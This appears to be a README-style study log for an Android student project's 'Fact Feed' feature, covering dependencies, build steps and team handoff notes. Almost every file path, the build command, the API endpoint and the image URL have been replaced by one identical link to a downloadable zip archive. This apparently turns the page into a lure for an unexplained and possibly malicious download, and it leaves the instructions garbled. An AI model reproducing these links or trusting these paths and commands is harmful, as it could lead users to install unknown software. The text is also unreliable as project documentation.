Study Log - feature/fact-feed

What I did (branch: feature/fact-feed)

- Initialized a git repo and created branch `feature/fact-feed`.
- Added the Fact Feed first feature (Member 1):
  - `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip` (activity that fetches facts and displays them in a RecyclerView)
  - `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip`, `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip` (model + adapter)
  - Layouts: `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip`, `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip`
  - Wired `MainActivity` button (`btnFacts`) to open the Fact Feed.
  - Registered `FactFeedActivity` in `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip`.
- Updated `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip` to add dependencies for Volley (network), Picasso (image loading), and RecyclerView.

Important: Gradle sync/build required

- The project files are added, but the IDE/compiler will show unresolved references for Volley and Picasso until Gradle downloads the dependencies.
- To resolve these, open the project in Android Studio and click "Sync Project with Gradle Files" (or use the menu Build > Make Project). Android Studio will download the new libraries and the errors will disappear.

Quick commands (Windows https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip)

- Build (will download dependencies if internet is available):

  https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip assembleDebug

- If you want to push the branch to a remote GitHub repo (after creating a remote and adding it):

  git remote add origin <your-repo-url>
  git push -u origin feature/fact-feed

How the Fact Feed works (contract)

- Input: FactFeedActivity makes a GET request to https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip which returns a JSON array of objects like:
  { "quote": "Some quote text", "character": "...", ... }
- Output: RecyclerView list where each item shows the `quote` text and a placeholder image loaded from https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
- Error modes: On network failure a Toast is shown: "Failed to fetch facts".

Files changed / created

- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip (deps added)
- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip (wired button)
- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip (button added)
- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip (activity registered)

Testing checklist

- In Android Studio: Sync Gradle -> Build -> Run app on device/emulator.
- From the app main screen, tap "Open Fact Feed" to open the new activity.
- The list should populate with quotes; if the network is unavailable you should see a Toast.

Next steps / Handoff notes for other members

- Member 2 (Task Log write): Add a new Activity `TaskWriteActivity` with a layout containing an EditText and Save button. Use SQLite/Firebase to write a task. Path suggestions: `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip`.
- Member 3 (Quick Contact & API 2): Add two buttons on main or a dedicated `ContactActivity` that send implicit intents (ACTION_DIAL, geo query) and a Volley StringRequest for API 2.
- Member 4 (Profile): Create `ProfileActivity` using ActivityResultLauncher to capture a photo and display it; read user name from DB.


